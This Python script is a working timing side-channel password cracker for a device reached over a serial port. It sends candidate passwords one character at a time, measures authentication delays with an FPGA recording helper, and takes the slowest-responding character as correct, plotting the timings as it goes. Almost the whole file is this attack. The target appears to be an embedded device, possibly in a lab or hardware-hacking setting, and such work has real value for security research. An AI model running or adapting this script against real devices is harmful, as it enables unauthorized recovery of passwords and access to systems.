import sys
import serial
import string
import time

import matplotlib.pyplot as plt

import sys, os
sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))
from main import Signal, FPGAPlaybackDevice, MHZ


s = serial.Serial(baudrate=115200, port='COM5')

candidates = string.ascii_letters + string.digits + ' ' + string.punctuation
repeat_letter_count = 3
cracked_password = ""

plt.ion()
plt.show()

while 1: 
    session = Signal.start_recording(sample_rate=1*MHZ, max_duration=1200, channels=[0, 1])

    for i in range(len(candidates)):
        candidate_password = cracked_password + candidates[i]

        # Send reset signal to device?        
        for _ in range(repeat_letter_count):
            s.reset_input_buffer()
            
            #playback.play()

            # Send password
            s.write((candidate_password + '\n').encode('utf-8'))

            # Wait for response
            response = s.read(1)
            if response == b'S':
                print("Password: " + candidate_password + "\n")
                session.finish_recording()
                sys.exit()
                break
            else:
                s.read(16)

    time.sleep(0.050)
    sent_signal, recvd_signal = session.finish_recording()

    # Analyze signal, find biggest delay
    # The longest authentication time is most likely the correct character
    requests = sent_signal.find_groups(by_synchronous=False, by_idle=9)
    responses = recvd_signal.find_groups(by_synchronous=False, by_idle=9)
    assert len(requests) == len(responses) 

    cracked_char = ''
    maximum_time = 0
    i = 0
    letter_time_sum = 0

    letter_times = {}

    #total_time_sum = 0
    for char, request, response in zip(''.join(repeat_letter_count * c for c in candidates), requests, responses):
        elapsed_time = response[0] - request[1]  # Start of response - end of request

        letter_time_sum += elapsed_time
        if (i + 1) % repeat_letter_count == 0:
            if letter_time_sum > maximum_time:
                maximum_time = letter_time_sum
                cracked_char = char
            letter_times[char] = letter_time_sum
            letter_time_sum = 0
        i += 1

    for c, t in sorted(letter_times.items(), reverse=True, key=lambda item: item[1])[:10]:
        print('{} {:0.8f}'.format(c, t))

    plt.clf()
    plt.boxplot(letter_times.values())
    plt.ylabel('Authentication Time (s)')
    plt.draw()
    plt.pause(1)

    cracked_password += cracked_char
    print("Predicted: '{}'".format(cracked_password))
    print('----------')